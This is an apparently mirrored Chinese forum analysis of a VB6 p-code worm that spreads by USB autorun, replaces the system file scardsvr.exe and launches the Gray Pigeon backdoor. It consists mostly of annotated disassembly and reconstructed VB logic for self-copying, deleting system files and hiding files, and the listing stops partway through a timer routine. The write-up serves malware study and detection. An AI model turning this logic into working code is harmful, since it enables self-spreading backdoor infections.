

# VBpCode 病毒分析实例

> 原文：[`www.pediy.com/kssd/pediy09/pediy09-732.htm`](https://www.pediy.com/kssd/pediy09/pediy09-732.htm)

> 【工    具】:P32Dasm v2.3  
> 【任    务】:病毒分析  
> 【操作平台】:Windows 2003 server   
> 【作    者】: LoveBoom\[DFCG\]\[FCG\]\[CUG\]  
> 【链    接】:N/A  
> 【简要说明】:  
> 这是一个 VB6 pCode 编译，功能代码比较简单的病毒，当时引起注意是因为这病毒运行后会替换系统文件。病毒的作用就是传播灰鸽子病毒。同时由于该病毒为 vb6 程序，因此这篇文章中我会尽量以 vb 的代码风格来分析/讲解。  
> 【病毒分析】:  
> 中了这个病毒后的表现如下:  
> 1、在移动硬盘/u 盘的根目录下可见 sky.exe 和 autorun.inf 文件(文件属性为系统隐藏)。  
> 2、可在本地系统和移动盘上找到 systemcheck.log 文件(该文件就是灰鸽子主程序)。  
> 3、病毒替换系统中的 scardsvr.exe 文件，并使该服务开机时自动加载(系统默认启动方式为手动)。  
> 4、在系统目录下可见 iexplorer.exe 的伪ＩＥ程序,文件大小为:36864 byte。  
> 如果你的机器上存在以下表象就要留意了，说不定就是该病毒。知道表象后，我用 peid 扫描了下，显示结果为 vb 程序，再用 ida 打开看了下，发现 ida 不能反汇编出相应的代码，然后联想到 vb 有 pcode 和 native 方式编译，pcode 编译出的代码是伪指令，而 native 编译后的是机器码，因此可以断定该程序是 pcode 程序，知道是 pcode 程序后，请出今天的主角 P32Dasm 载入目标程序，结果非常明了。通过反编译，可以得出病毒响应以下几个事件:  
> Main()  
> Form\_load()  
> Timer1\_timer()  
> 下面分别以代码方式看看这几个事件中具体又做了些什么:  
> Sub Main()  
> 00004EA0:  00   LargeBos  
> 00004EA2:  00   LargeBos  
> 00004EA4:  4B   OnErrorGoto    ;On Error Resume Next,出错时忽略错误　  
> 00004EA7:  00   LargeBos  
> 00004EA9:  04   FLdRfVar szIE  
> 00004EAC:  04   FLdRfVar var\_88  
> 00004EAF:  05   ImpAdLdRf  
> 00004EB2:  24   NewIfNullPr  
> 00004EB5:  0D   VCallHresult Global.Get\_App() As App  
> 00004EBA:  08   FLdPr var\_88  
> 00004EBD:  0D   VCallHresult App.Get\_EXEName()  
> 00004EC2:  3E   FLdZeroAd szIE  
> 00004EC5:  46   CVarStr var\_9C  
> 00004EC8:  04   FLdRfVar var\_AC  
> 00004ECB:  0A   ImpAdCallFPR4 LCase()  
> 00004ED0:  04   FLdRfVar var\_AC  
> 00004ED3:  FCF6 FStVar var\_BC  
> 00004ED7:  1A   FFree1Ad var\_88  
> 00004EDA:  35   FFree1Var var\_9C  
> 00004EDD:  00   LargeBos        ;获取程序名并将名字小写  
> 00004EDF:  04   FLdRfVar var\_BC    ;szAppName = lcase(app.exename)    
> 00004EE2:  3A   LitVarStr: "iexplorer"  
> 00004EE7:  5D   HardType  
> 00004EE8:  FB33 EqVarBool =      ;如果文件名不为"iexplorer.exe 则跳  
> 00004EEA:  1C   BranchF   Next\_4F0A  
> 00004EED:  00   LargeBos      ;if szAppName = "iexplorer" then exit sub  
> 00004EEF:  05   ImpAdLdRf    ;如果程序名为 iexplorer.exe 则退出 sub main 过程  
> 00004EF2:  56   NewIfNullAd  
> 00004EF5:  FD9C FStAdNoPop  
> 00004EF9:  05   ImpAdLdRf  
> 00004EFC:  24   NewIfNullPr  
> 00004EFF:  0D   VCallHresult Global.\_Load(object As IDispatch)  
> 00004F04:  1A   FFree1Ad var\_88  
> 00004F07:  1E   Branch   SubMain\_ExitSub  
> Next\_4F0A:   
> 00004F0A:  00   LargeBos  
> 00004F0C:  04   FLdRfVar var\_BC  ;if szAppName <> "scardsvr" then goto Next\_5139  
> 00004F0F:  3A   LitVarStr: "scardsvr"  
> 00004F14:  5D   HardType  
> 00004F15:  FB33 EqVarBool =      ;如果程序名不为"scardsvr"则跳  
> 00004F17:  1C   BranchF   Next\_5139  
> 00004F1A:  00   LargeBos  
> 00004F1C:  04   FLdRfVar szIE  
> 00004F1F:  04   FLdRfVar var\_88  
> 00004F22:  05   ImpAdLdRf  
> 00004F25:  24   NewIfNullPr  
> 00004F28:  0D   VCallHresult Global.Get\_App() As App  
> 00004F2D:  08   FLdPr var\_88  
> 00004F30:  0D   VCallHresult App.Get\_Path()  
> 00004F35:  F5   LitI4: 7 0x7  
> 00004F3A:  6C   ILdRf szIE  
> 00004F3D:  1B   LitStr: "\\iexplorer.exe"  
> 00004F40:  2A   ConcatStr  
> 00004F41:  46   CVarStr var\_9C  
> 00004F44:  0B   ImpAdCallI2 Dir()  ;if dir(app.path & "\\iexplorer.exe") <> "" then goto Next\_5075  
> 00004F49:  23   FStStrNoPop var\_D0  
> 00004F4C:  1B   LitStr: ""      ;这里其实病毒作者写的有问题,vb 中 app.path 函数返回有以下两种情况:  
> 1、程序在根目录下返回为"c:\\"(注:其中 C 代表分区名);  
> 2、程序不在根目录下返回为"c:\\path"  
> 也就是说如果程序在根目录下那病毒后面的很多操作可能会失败。  
> 00004F4F:  FB30 EqStr =  
> 00004F51:  32   FFreeStr szIE var\_D0  
> 00004F58:  1A   FFree1Ad var\_88  
> 00004F5B:  35   FFree1Var var\_9C  
> 00004F5E:  1C   BranchF   Next\_5075  ;如果当前目录下的 iexplorer.exe 文件存在则跳  
> 00004F61:  00   LargeBos  
> 00004F63:  F5   LitI4: 0 0x0  
> 00004F68:  1B   LitStr: "Scripting.FileSystemObject"  
> 00004F6B:  04   FLdRfVar var\_9C  
> 00004F6E:  0A   ImpAdCallFPR4 rtcCreateObject2  
> 00004F73:  04   FLdRfVar var\_9C  
> 00004F76:  04   FLdRfVar var\_E0  
> 00004F79:  FE4E SetVarVarFunc  
> ......  
> 00004F89:  0D   VCallHresult Global.Get\_App() As App  
> 00004F8E:  08   FLdPr var\_88  
> 00004F91:  0D   VCallHresult App.Get\_Path()  
> 00004F96:  6C   ILdRf szIE  
> 00004F99:  1B   LitStr: "\\"  
> 00004F9C:  2A   ConcatStr  
> 00004F9D:  23   FStStrNoPop var\_E8  
> ......  
> 00004FAC:  0D   VCallHresult Global.Get\_App() As App  
> 00004FB1:  08   FLdPr var\_E4  
> 00004FB4:  0D   VCallHresult App.Get\_EXEName()  
> 00004FB9:  6C   ILdRf var\_D0  
> 00004FBC:  2A   ConcatStr  
> 00004FBD:  23   FStStrNoPop var\_EC  
> 00004FC0:  1B   LitStr: ".exe"  
> ......  
> 00004FFB:  0D   VCallHresult Global.Get\_App() As App  
> 00005000:  08   FLdPr var\_88  
> 00005003:  0D   VCallHresult App.Get\_Path()  
> 00005008:  6C   ILdRf szIE  
> 0000500B:  1B   LitStr: "\\iexplorer.exe"  
> ......  
> 00005018:  FE98 LateMemCall      ;如果当前目录下的 iexplorer.exe 不存在则执行如下操作  
> ;原程序用的 fs 来做的，其实就是简单的复制操作  
> ; CopyFile app.path &"\\" & app.exename,app.path & "\\iexplorer.exe"  
> ;将病毒自身复制至当前目录下命名为:"iexplorer.exe"  
> ......  
> 00005035:  0D   VCallHresult Global.Get\_App() As App  
> 0000503A:  08   FLdPr var\_88  
> 0000503D:  0D   VCallHresult App.Get\_Path()  
> 00005042:  6C   ILdRf szIE  
> 00005045:  1B   LitStr: "\\iexplorer.exe"  
> 00005048:  2A   ConcatStr  
> 00005049:  46   CVarStr var\_9C  
> 0000504C:  25   PopAdLdVar  
> 0000504D:  04   FLdRfVar var\_E0  
> 00005050:  FF42 VarLateMemCallLdVar  
> 00005058:  04   FLdRfVar var\_FC  
> 0000505B:  FE4E SetVarVarFunc  
> 0000505D:  2F   FFree1Str szIE  
> 00005060:  1A   FFree1Ad var\_88  
> 00005063:  35   FFree1Var var\_9C  
> 00005066:  00   LargeBos  
> 00005068:  28   LitVarI2: 7 0x7 var\_CC  
> 0000506D:  25   PopAdLdVar  
> 0000506E:  04   FLdRfVar var\_FC  
> 00005071:  FF43 VarLateMemSt  
> Next\_5075:   
> 00005075:  00   LargeBos  
> 00005077:  00   LargeBos  
> 00005079:  04   FLdRfVar szIE  
> 0000507C:  04   FLdRfVar var\_88  
> 0000507F:  05   ImpAdLdRf  
> 00005082:  24   NewIfNullPr  
> 00005085:  0D   VCallHresult Global.Get\_App() As App  
> 0000508A:  08   FLdPr var\_88  
> 0000508D:  0D   VCallHresult App.Get\_Path()  
> 00005092:  F5   LitI4: 0 0x0  
> 00005097:  6C   ILdRf szIE  
> 0000509A:  1B   LitStr: "\\iexplorer.exe"  
> 0000509D:  2A   ConcatStr  
> 0000509E:  46   CVarStr var\_9C  
> 000050A1:  0A   ImpAdCallFPR4 Shell()  ;复制完毕后执行程序 shell app.path &"\\iexplorer.exe"  
> 000050A6:  74   FStFPR8  
> 000050A9:  2F   FFree1Str szIE  
> 000050AC:  1A   FFree1Ad var\_88  
> 000050AF:  35   FFree1Var var\_9C  
> 000050B2:  00   LargeBos  
> 000050B4:  04   FLdRfVar szIE  
> 000050B7:  04   FLdRfVar var\_88  
> 000050BA:  05   ImpAdLdRf  
> 000050BD:  24   NewIfNullPr  
> 000050C0:  0D   VCallHresult Global.Get\_App() As App  
> 000050C5:  08   FLdPr var\_88  
> 000050C8:  0D   VCallHresult App.Get\_Path()  
> 000050CD:  F5   LitI4: 7 0x7  
> 000050D2:  6C   ILdRf szIE  
> 000050D5:  1B   LitStr: "\\windowsupdate.log"  
> 000050D8:  2A   ConcatStr  
> 000050D9:  46   CVarStr var\_9C  
> 000050DC:  0B   ImpAdCallI2 Dir()  
> 000050E1:  23   FStStrNoPop var\_D0  
> 000050E4:  1B   LitStr: ""      
> ;if dir(app.path &"\\windowsupdate.log")<>"" then  
> ;  shell app.path &"\\windowsupdate.log"  
> ;end if  
> 000050E7:  FB3D NeStr <>  
> 000050E9:  32   FFreeStr szIE var\_D0  
> 000050F0:  1A   FFree1Ad var\_88  
> 000050F3:  35   FFree1Var var\_9C  
> 000050F6:  1C   BranchF   ExitSub\_5134  
> 000050F9:  00   LargeBos  
> 000050FB:  04   FLdRfVar szIE  
> 000050FE:  04   FLdRfVar var\_88  
> 00005101:  05   ImpAdLdRf  
> 00005104:  24   NewIfNullPr  
> 00005107:  0D   VCallHresult Global.Get\_App() As App  
> 0000510C:  08   FLdPr var\_88  
> 0000510F:  0D   VCallHresult App.Get\_Path()  
> 00005114:  F5   LitI4: 0 0x0  
> 00005119:  6C   ILdRf szIE  
> 0000511C:  1B   LitStr: "\\windowsupdate.log"  
> 0000511F:  2A   ConcatStr  
> 00005120:  46   CVarStr var\_9C  
> 00005123:  0A   ImpAdCallFPR4 Shell()  ;如果病毒当前目录下存在 Windowsupdate.log 文件则执行该程序  
> 00005128:  74   FStFPR8  
> 0000512B:  2F   FFree1Str szIE  
> 0000512E:  1A   FFree1Ad var\_88  
> 00005131:  35   FFree1Var var\_9C  
> ExitSub\_5134:   
> 00005134:  00   LargeBos  
> 00005136:  1E   Branch   SubMain\_ExitSub  
> Next\_5139:           ;程序名为不 iexplorer 也不为 scardsvr 则跳到这里  
> 00005139:  00   LargeBos  
> 0000513B:  00   LargeBos  
> 0000513D:  F5   LitI4: 0 0x0  
> 00005142:  1B   LitStr: "Scripting.FileSystemObject"  
> 00005145:  04   FLdRfVar var\_9C  
> 00005148:  0A   ImpAdCallFPR4 rtcCreateObject2  
> 0000514D:  04   FLdRfVar var\_9C  
> 00005150:  04   FLdRfVar var\_E0  
> 00005153:  FE4E SetVarVarFunc  
> 00005155:  00   LargeBos  
> 00005157:  28   LitVarI2: 1 0x1 var\_CC  
> 0000515C:  25   PopAdLdVar  
> 0000515D:  04   FLdRfVar var\_E0  
> 00005160:  FF42 VarLateMemCallLdVar  
> 00005168:  FC8B PopAd  
> 0000516A:  F5   LitI4: 7 0x7  
> 0000516F:  04   FLdRfVar var\_9C  
> 00005172:  3A   LitVarStr: "\\iexplorer.exe"  
> 00005177:  FBEF ConcatVar  
> 0000517B:  0B   ImpAdCallI2 Dir()  
> 00005180:  23   FStStrNoPop szIE  
> 00005183:  1B   LitStr: ""  
> 00005186:  FB30 EqStr =  
> 00005188:  2F   FFree1Str szIE  
> 0000518B:  36   FFreeVar var\_9C var\_AC  
> 00005192:  1C   BranchF   ShellExplorer    ;系统目录下的 iexploer.exe 文件存在则执行打开资源管理器操作  
> 00005195:  00   LargeBos  
> 00005197:  28   LitVarI2: 1 0x1 var\_CC  
> 0000519C:  25   PopAdLdVar  
> 0000519D:  04   FLdRfVar var\_E0  
> 000051A0:  FF42 VarLateMemCallLdVar  
> 000051A8:  FC8B PopAd  
> 000051AA:  F5   LitI4: 7 0x7  
> 000051AF:  04   FLdRfVar var\_9C  
> 000051B2:  3A   LitVarStr: "\\dllcache\\scardsvr.exe"  
> 000051B7:  FBEF ConcatVar  
> 000051BB:  0B   ImpAdCallI2 Dir()  
> 000051C0:  23   FStStrNoPop szIE  
> 000051C3:  1B   LitStr: ""  
> 000051C6:  FB3D NeStr <>  
> 000051C8:  2F   FFree1Str szIE  
> 000051CB:  36   FFreeVar var\_9C var\_AC  
> 000051D2:  1C   BranchF   000051FD  
> 000051D5:  00   LargeBos  
> 000051D7:  28   LitVarI2: 1 0x1 var\_CC  
> 000051DC:  25   PopAdLdVar  
> 000051DD:  04   FLdRfVar var\_E0  
> 000051E0:  FF42 VarLateMemCallLdVar  
> 000051E8:  3A   LitVarStr: "\\dllcache\\scardsvr.exe"    ;dllcache 目录下的 scardsvr.exe 存在则删除该文件  
> 000051ED:  FBEF ConcatVar  
> 000051F1:  0A   ImpAdCallFPR4 Kill()  
> 000051F6:  36   FFreeVar var\_9C var\_AC  
> ;if dir("%system%\\dllcache\\scardsvr.exe")<> "" then  
> ;  kill "%system%\\dllcache\\scardsvr.exe"  
> ;End if  
> 000051FD:   
> 000051FD:  00   LargeBos  
> 000051FF:  00   LargeBos  
> 00005201:  28   LitVarI2: 1 0x1 var\_CC  
> 00005206:  25   PopAdLdVar  
> 00005207:  04   FLdRfVar var\_E0  
> 0000520A:  FF42 VarLateMemCallLdVar  
> 00005212:  FC8B PopAd  
> 00005214:  F5   LitI4: 7 0x7  
> 00005219:  04   FLdRfVar var\_9C  
> 0000521C:  3A   LitVarStr: "\\scardsvr.exe"  
> 00005221:  FBEF ConcatVar  
> 00005225:  0B   ImpAdCallI2 Dir()  
> 0000522A:  23   FStStrNoPop szIE  
> 0000522D:  1B   LitStr: ""  
> 00005230:  FB3D NeStr <>  
> 00005232:  2F   FFree1Str szIE  
> 00005235:  36   FFreeVar var\_9C var\_AC  
> 0000523C:  1C   BranchF   00005267  
> 0000523F:  00   LargeBos  
> 00005241:  28   LitVarI2: 1 0x1 var\_CC  
> 00005246:  25   PopAdLdVar  
> 00005247:  04   FLdRfVar var\_E0  
> 0000524A:  FF42 VarLateMemCallLdVar  
> 00005252:  3A   LitVarStr: "\\scardsvr.exe"  
> 00005257:  FBEF ConcatVar  
> 0000525B:  0A   ImpAdCallFPR4 Kill()    ;system32 目录下的 scardsvr.exe 存在则删除该文件  
> 00005260:  36   FFreeVar var\_9C var\_AC  
> ;if dir("%system%\\dllcache\\scardsvr.exe")<> "" then  
> ;  kill "%system%\\dllcache\\scardsvr.exe"  
> ;End if  
> 00005267:   
> 00005267:  00   LargeBos  
> 00005269:  00   LargeBos  
> 0000526B:  04   FLdRfVar szIE  
> 0000526E:  04   FLdRfVar var\_88  
> 00005271:  05   ImpAdLdRf  
> 00005274:  24   NewIfNullPr  
> 00005277:  0D   VCallHresult Global.Get\_App() As App  
> 0000527C:  08   FLdPr var\_88  
> 0000527F:  0D   VCallHresult App.Get\_Path()  
> 00005284:  6C   ILdRf szIE  
> 00005287:  1B   LitStr: "\\"  
> 0000528A:  2A   ConcatStr  
> 0000528B:  23   FStStrNoPop var\_E8  
> 0000528E:  04   FLdRfVar var\_D0  
> 00005291:  04   FLdRfVar var\_E4  
> 00005294:  05   ImpAdLdRf  
> 00005297:  24   NewIfNullPr  
> 0000529A:  0D   VCallHresult Global.Get\_App() As App  
> 0000529F:  08   FLdPr var\_E4  
> 000052A2:  0D   VCallHresult App.Get\_EXEName()  
> 000052A7:  6C   ILdRf var\_D0  
> 000052AA:  2A   ConcatStr  
> 000052AB:  23   FStStrNoPop var\_EC  
> 000052AE:  1B   LitStr: ".exe"  
> 000052B1:  2A   ConcatStr  
> 000052B2:  46   CVarStr var\_9C  
> 000052B5:  25   PopAdLdVar  
> 000052B6:  04   FLdRfVar var\_E0  
> 000052B9:  FF42 VarLateMemCallLdVar  
> 000052C1:  04   FLdRfVar var\_FC  
> 000052C4:  FE4E SetVarVarFunc  
> 000052C6:  32   FFreeStr szIE var\_E8 var\_D0 var\_EC  
> 000052D1:  29   FFreeAd: var\_88 var\_E4  
> 000052D8:  35   FFree1Var var\_9C  
> 000052DB:  00   LargeBos  
> 000052DD:  28   LitVarI2: 1 0x1 var\_CC  
> 000052E2:  25   PopAdLdVar  
> 000052E3:  04   FLdRfVar var\_E0  
> 000052E6:  FF42 VarLateMemCallLdVar  
> 000052EE:  3A   LitVarStr: "\\scardsvr.exe"    ;复制病毒自身为%system32%\\scardsvr.exe  
> 000052F3:  FBEF ConcatVar  
> 000052F7:  25   PopAdLdVar  
> 000052F8:  04   FLdRfVar var\_FC  
> 000052FB:  FD9F LdPrVar  
> 000052FD:  FE98 LateMemCall  
> 00005303:  36   FFreeVar var\_9C var\_AC  
> ;CopyFile app.path & "\\" & app.exename &".exe",%system32%\\scardsvr.exe  
> 0000530A:  00   LargeBos  
> 0000530C:  28   LitVarI2: 1 0x1 var\_CC  
> 00005311:  25   PopAdLdVar  
> 00005312:  04   FLdRfVar var\_E0  
> 00005315:  FF42 VarLateMemCallLdVar  
> 0000531D:  3A   LitVarStr: "\\dllcache\\scardsvr.exe"    ;复制病毒自身为%system32%\\dllcache\\scardsvr.exe  
> 00005322:  FBEF ConcatVar  
> 00005326:  25   PopAdLdVar  
> 00005327:  04   FLdRfVar var\_FC  
> 0000532A:  FD9F LdPrVar  
> 0000532C:  FE98 LateMemCall  
> 00005332:  36   FFreeVar var\_9C var\_AC  
> ;CopyFile app.path & "\\" & app.exename &".exe",%system32%\\dllcache\\scardsvr.exe  
> 00005339:  00   LargeBos  
> 0000533B:  28   LitVarI2: 1 0x1 var\_CC  
> 00005340:  25   PopAdLdVar  
> 00005341:  04   FLdRfVar var\_E0  
> 00005344:  FF42 VarLateMemCallLdVar  
> 0000534C:  3A   LitVarStr: "\\IEXPLORER.EXE"  
> 00005351:  FBEF ConcatVar  
> 00005355:  25   PopAdLdVar  
> 00005356:  04   FLdRfVar var\_FC  
> 00005359:  FD9F LdPrVar  
> 0000535B:  FE98 LateMemCall  
> 00005361:  36   FFreeVar var\_9C var\_AC  
> 00005368:  00   LargeBos  
> 0000536A:  28   LitVarI2: 1 0x1 var\_CC  
> 0000536F:  25   PopAdLdVar  
> 00005370:  04   FLdRfVar var\_E0  
> 00005373:  FF42 VarLateMemCallLdVar  
> 0000537B:  3A   LitVarStr: "\\scardsvr.exe"    ;设置文件属性为系统隐藏  
> ;也就是相当于 vb 中的 SetAttr %system32%\\scardsvr.exe,vbHidden Or vbSystem Or vbReadOnly  
> 00005380:  FBEF ConcatVar  
> 00005384:  25   PopAdLdVar  
> 00005385:  04   FLdRfVar var\_E0  
> 00005388:  FF42 VarLateMemCallLdVar  
> 00005390:  04   FLdRfVar var\_FC  
> 00005393:  FE4E SetVarVarFunc  
> 00005395:  36   FFreeVar var\_9C var\_AC  
> 0000539C:  00   LargeBos  
> 0000539E:  28   LitVarI2: 7 0x7 var\_CC  
> 000053A3:  25   PopAdLdVar  
> 000053A4:  04   FLdRfVar var\_FC  
> 000053A7:  FF43 VarLateMemSt  
> 000053AB:  00   LargeBos  
> 000053AD:  28   LitVarI2: 1 0x1 var\_CC  
> 000053B2:  25   PopAdLdVar  
> 000053B3:  04   FLdRfVar var\_E0  
> 000053B6:  FF42 VarLateMemCallLdVar  
> 000053BE:  3A   LitVarStr: "\\iexplorer.exe"    ;设置文件属性为系统隐藏  
> ;SetAttr %system32%\\scardsvr.exe,vbHidden Or vbSystem Or vbReadOnly  
> 000053C3:  FBEF ConcatVar  
> 000053C7:  25   PopAdLdVar  
> 000053C8:  04   FLdRfVar var\_E0  
> 000053CB:  FF42 VarLateMemCallLdVar  
> 000053D3:  04   FLdRfVar var\_FC  
> 000053D6:  FE4E SetVarVarFunc  
> 000053D8:  36   FFreeVar var\_9C var\_AC  
> 000053DF:  00   LargeBos  
> 000053E1:  28   LitVarI2: 7 0x7 var\_CC  
> 000053E6:  25   PopAdLdVar  
> 000053E7:  04   FLdRfVar var\_FC  
> 000053EA:  FF43 VarLateMemSt  
> 000053EE:  00   LargeBos  
> 000053F0:  04   FLdRfVar szIE  
> 000053F3:  04   FLdRfVar var\_88  
> 000053F6:  05   ImpAdLdRf  
> 000053F9:  24   NewIfNullPr  
> 000053FC:  0D   VCallHresult Global.Get\_App() As App  
> 00005401:  08   FLdPr var\_88  
> 00005404:  0D   VCallHresult App.Get\_Path()  
> 00005409:  28   LitVarI2: 1 0x1 var\_CC  
> 0000540E:  25   PopAdLdVar  
> 0000540F:  04   FLdRfVar var\_E0  
> 00005412:  FF42 VarLateMemCallLdVar  
> 0000541A:  FC8B PopAd  
> 0000541C:  F5   LitI4: 7 0x7  
> 00005421:  6C   ILdRf szIE  
> 00005424:  1B   LitStr: "\\systemcheck.log"    ;当前目录下的 systemcheck.log 文件存在，  
> 则复制该文件至%system32%\\windowsupdate.log,然后运行复制后的文件.  
> 00005427:  2A   ConcatStr  
> 00005428:  46   CVarStr var\_9C  
> 0000542B:  0B   ImpAdCallI2 Dir()  
> 00005430:  23   FStStrNoPop var\_D0  
> 00005433:  1B   LitStr: ""  
> 00005436:  FB3D NeStr <>  
> 00005438:  F5   LitI4: 7 0x7  
> 0000543D:  04   FLdRfVar var\_AC  
> 00005440:  3A   LitVarStr: "\\windowsupdate.log"  
> 00005445:  FBEF ConcatVar  
> 00005449:  0B   ImpAdCallI2 Dir()  
> 0000544E:  23   FStStrNoPop var\_E8  
> 00005451:  1B   LitStr: ""  
> 00005454:  FB30 EqStr =  
> 00005456:  C4   AndI4 And  
> 00005457:  32   FFreeStr szIE var\_D0 var\_E8  
> 00005460:  1A   FFree1Ad var\_88  
> 00005463:  36   FFreeVar var\_9C var\_AC var\_144  
> 0000546C:  1C   BranchF   00005555  
> 0000546F:  00   LargeBos  
> 00005471:  04   FLdRfVar szIE  
> 00005474:  04   FLdRfVar var\_88  
> 00005477:  05   ImpAdLdRf  
> 0000547A:  24   NewIfNullPr  
> 0000547D:  0D   VCallHresult Global.Get\_App() As App  
> 00005482:  08   FLdPr var\_88  
> 00005485:  0D   VCallHresult App.Get\_Path()  
> 0000548A:  6C   ILdRf szIE  
> 0000548D:  1B   LitStr: "\\systemcheck.log"  
> 00005490:  2A   ConcatStr  
> 00005491:  46   CVarStr var\_9C  
> 00005494:  25   PopAdLdVar  
> 00005495:  04   FLdRfVar var\_E0  
> 00005498:  FF42 VarLateMemCallLdVar  
> 000054A0:  04   FLdRfVar var\_FC  
> 000054A3:  FE4E SetVarVarFunc  
> 000054A5:  2F   FFree1Str szIE  
> 000054A8:  1A   FFree1Ad var\_88  
> 000054AB:  35   FFree1Var var\_9C  
> 000054AE:  00   LargeBos  
> 000054B0:  28   LitVarI2: 1 0x1 var\_CC  
> 000054B5:  25   PopAdLdVar  
> 000054B6:  04   FLdRfVar var\_E0  
> 000054B9:  FF42 VarLateMemCallLdVar  
> 000054C1:  3A   LitVarStr: "\\windowsupdate.log"  
> 000054C6:  FBEF ConcatVar  
> 000054CA:  25   PopAdLdVar  
> 000054CB:  04   FLdRfVar var\_FC  
> 000054CE:  FD9F LdPrVar  
> 000054D0:  FE98 LateMemCall  
> 000054D6:  36   FFreeVar var\_9C var\_AC  
> 000054DD:  00   LargeBos  
> 000054DF:  28   LitVarI2: 1 0x1 var\_CC  
> 000054E4:  25   PopAdLdVar  
> 000054E5:  04   FLdRfVar var\_E0  
> 000054E8:  FF42 VarLateMemCallLdVar  
> 000054F0:  3A   LitVarStr: "\\windowsupdate.log"  
> 000054F5:  FBEF ConcatVar  
> 000054F9:  25   PopAdLdVar  
> 000054FA:  04   FLdRfVar var\_E0  
> 000054FD:  FF42 VarLateMemCallLdVar  
> 00005505:  04   FLdRfVar var\_FC  
> 00005508:  FE4E SetVarVarFunc  
> 0000550A:  36   FFreeVar var\_9C var\_AC  
> 00005511:  00   LargeBos  
> 00005513:  28   LitVarI2: 7 0x7 var\_CC  
> 00005518:  25   PopAdLdVar  
> 00005519:  04   FLdRfVar var\_FC  
> 0000551C:  FF43 VarLateMemSt  
> 00005520:  00   LargeBos  
> 00005522:  28   LitVarI2: 1 0x1 var\_CC  
> 00005527:  25   PopAdLdVar  
> 00005528:  04   FLdRfVar var\_E0  
> 0000552B:  FF42 VarLateMemCallLdVar  
> 00005533:  FC8B PopAd  
> 00005535:  F5   LitI4: 0 0x0  
> 0000553A:  04   FLdRfVar var\_9C  
> 0000553D:  3A   LitVarStr: "\\windowsupdate.log"  
> 00005542:  FBEF ConcatVar  
> 00005546:  0A   ImpAdCallFPR4 Shell()  
> 0000554B:  74   FStFPR8  
> 0000554E:  36   FFreeVar var\_9C var\_AC  
> ;if dir(app.path & "\\systemcheck.log") <> "" and dir(%system32% & "\\windowsupdate.log")= "" then  
> ;  CopyFile app.path & "\\systemcheck.log", %system32%\\windowsupdate.log  
> ;  shell %system32%\\windowsupdate.log  
> ;end if  
> 00005555:   
> 00005555:  00   LargeBos  
> 00005557:  00   LargeBos  
> 00005559:  28   LitVarI2: 1 0x1 var\_CC  
> 0000555E:  25   PopAdLdVar  
> 0000555F:  04   FLdRfVar var\_E0  
> 00005562:  FF42 VarLateMemCallLdVar  
> 0000556A:  FC8B PopAd  
> 0000556C:  F5   LitI4: 0 0x0  
> 00005571:  04   FLdRfVar var\_9C  
> 00005574:  3A   LitVarStr: "\\iexplorer.exe"    ;运行系统目录下的 iexplorer.exe 文件  
> 00005579:  FBEF ConcatVar  
> 0000557D:  0A   ImpAdCallFPR4 Shell()  
> 00005582:  74   FStFPR8  
> 00005585:  36   FFreeVar var\_9C var\_AC  
> ;shell %system32%\\iexplorer.exe  
> ShellExplorer:   
> 0000558E:  00   LargeBos  
> 00005590:  04   FLdRfVar szIE  
> 00005593:  04   FLdRfVar var\_88  
> 00005596:  05   ImpAdLdRf  
> 00005599:  24   NewIfNullPr  
> 0000559C:  0D   VCallHresult Global.Get\_App() As App  
> 000055A1:  08   FLdPr var\_88  
> 000055A4:  0D   VCallHresult App.Get\_Path()  
> 000055A9:  F5   LitI4: 3 0x3  
> 000055AE:  3E   FLdZeroAd szIE  
> 000055B1:  46   CVarStr var\_9C  
> 000055B4:  04   FLdRfVar var\_AC  
> 000055B7:  0A   ImpAdCallFPR4 Left()  
> 000055BC:  F5   LitI4: 1 0x1  
> 000055C1:  3A   LitVarStr: "explorer "  
> 000055C6:  04   FLdRfVar var\_AC  
> 000055C9:  FBEF ConcatVar  
> 000055CD:  0A   ImpAdCallFPR4 Shell()  ;打开资源管理器,打开路径为当前病毒所在的根目录  
> 000055D2:  74   FStFPR8  
> 000055D5:  1A   FFree1Ad var\_88  
> 000055D8:  36   FFreeVar var\_9C var\_AC var\_144  
> ;shell "explorer " & left$(app.path,3)  
> SubMain\_ExitSub:    
> 000055E1:  00   LargeBos  
> 000055E3:  00   LargeBos  
> 000055E5:  14   ExitProc  
> ;Exit sub  
> End Sub  
>   
> Private Sub Form\_Load()  
> 000046D0:  F4   LitI2\_Byte: 255 0xFF (True)  
> 000046D2:  21   FLdPrThis  
> 000046D3:  0F   VCallAd  
> 000046D6:  19   FStAdFunc var\_88  
> 000046D9:  08   FLdPr var\_88  
> 000046DC:  0D   VCallHresult Timer.Set\_Enabled()  
> 000046E1:  1A   FFree1Ad var\_88  
> 000046E4:  13   ExitProcHresult  
> ;Timer1.InterVal = 255    ;设置时间控件的时间间隔  
> ;Timer1.Enabled = true    ;激活时间控件  
> ;Exit sub  
> End Sub  
>   
> Private Sub Timer1\_Timer()  
> 0000471C:  00   LargeBos  
> 0000471E:  00   LargeBos  
> 00004720:  4B   OnErrorGoto  
> 00004723:  00   LargeBos  
> 00004725:  04   FLdRfVar szIE  
> 00004728:  04   FLdRfVar var\_88  
> 0000472B:  05   ImpAdLdRf  
> 0000472E:  24   NewIfNullPr  
> 00004731:  0D   VCallHresult Global.Get\_App() As App  
> 00004736:  08   FLdPr var\_88  
> 00004739:  0D   VCallHresult App.Get\_Path()    ;先判断病毒当前目录下的 scardsvr.exe 文件是否存在,  
> 不存在则复制病毒体本身为该文件  
> 0000473E:  F5   LitI4: 7 0x7  
> 00004743:  6C   ILdRf szIE  
> 00004746:  1B   LitStr: "\\scardsvr.exe"  
> 00004749:  2A   ConcatStr  
> 0000474A:  46   CVarStr var\_9C  
> 0000474D:  0B   ImpAdCallI2 Dir()  
> 00004752:  23   FStStrNoPop var\_A0  
> 00004755:  1B   LitStr: ""  
> 00004758:  FB30 EqStr =  
> 0000475A:  32   FFreeStr szIE var\_A0  
> 00004761:  1A   FFree1Ad var\_88  
> 00004764:  35   FFree1Var var\_9C  
> 00004767:  1C   BranchF   0000487E  
> 0000476A:  00   LargeBos  
> 0000476C:  F5   LitI4: 0 0x0  
> 00004771:  1B   LitStr: "Scripting.FileSystemObject"  
> 00004774:  04   FLdRfVar var\_9C  
> 00004777:  0A   ImpAdCallFPR4 rtcCreateObject2  
> 0000477C:  04   FLdRfVar var\_9C  
> 0000477F:  04   FLdRfVar var\_B0  
> 00004782:  FE4E SetVarVarFunc  
> 00004784:  00   LargeBos  
> 00004786:  04   FLdRfVar szIE  
> 00004789:  04   FLdRfVar var\_88  
